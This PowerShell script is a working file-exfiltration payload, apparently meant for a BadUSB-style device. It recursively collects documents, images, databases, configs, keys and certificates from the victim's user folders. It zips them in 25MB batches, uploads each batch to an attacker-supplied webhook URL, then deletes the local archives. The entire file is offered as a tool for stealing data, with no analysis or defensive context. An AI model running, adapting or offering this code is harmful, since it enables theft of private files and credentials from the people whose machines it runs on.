$hookurl = "$dc"
# Shortened URL Detection
if ($hookurl.Length -ne 121) {
    Write-Host "Shortened Webhook URL Detected.."
    $hookurl = (Invoke-RestMethod -Uri $hookurl).url
}

Function Exfiltrate {
    param (
        [string[]]$FileType,
        [string[]]$Path
    )
    
    $maxZipFileSize = 25MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:temp/Loot$index.zip"

    if ($Path -ne $null) {
        $foldersToSearch = "$env:USERPROFILE\$Path"
    } else {
        $foldersToSearch = @(
            "$env:USERPROFILE\Documents",
            "$env:USERPROFILE\Desktop",
            "$env:USERPROFILE\Downloads",
            "$env:USERPROFILE\OneDrive",
            "$env:USERPROFILE\Pictures",
            "$env:USERPROFILE\Videos"
        )
    }

    if ($FileType -ne $null) {
        $fileExtensions = $FileType | ForEach-Object { "*.$_" }
    } else {
        $fileExtensions = @(
            "*.log", "*.db", "*.txt", "*.doc", "*.pdf",
            "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc",
            "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg",
            "*.conf", "*.wpd", "*.rft"
        )
    }

    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

    try {
        foreach ($folder in $foldersToSearch) {
            foreach ($extension in $fileExtensions) {
                $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    $fileSize = $file.Length
                    if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                        $zipArchive.Dispose()
                        $currentZipSize = 0
                        Invoke-WebRequest -Uri $hookurl -Method Post -Form @{file1=Get-Item $zipFilePath}
                        Remove-Item -Path $zipFilePath -Force
                        Start-Sleep -Seconds 1
                        $index++
                        $zipFilePath = "$env:temp/Loot$index.zip"
                        $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                    }
                    $entryName = $file.FullName.Substring($folder.Length + 1)
                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                    $currentZipSize += $fileSize
                }
            }
        }
        $zipArchive.Dispose()
        Invoke-WebRequest -Uri $hookurl -Method Post -Form @{file1=Get-Item $zipFilePath}
        Remove-Item -Path $zipFilePath -Force
        Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
    } catch {
        Write-Error "An error occurred: $_"
    }
}

# Execute the Exfiltrate function
Exfiltrate
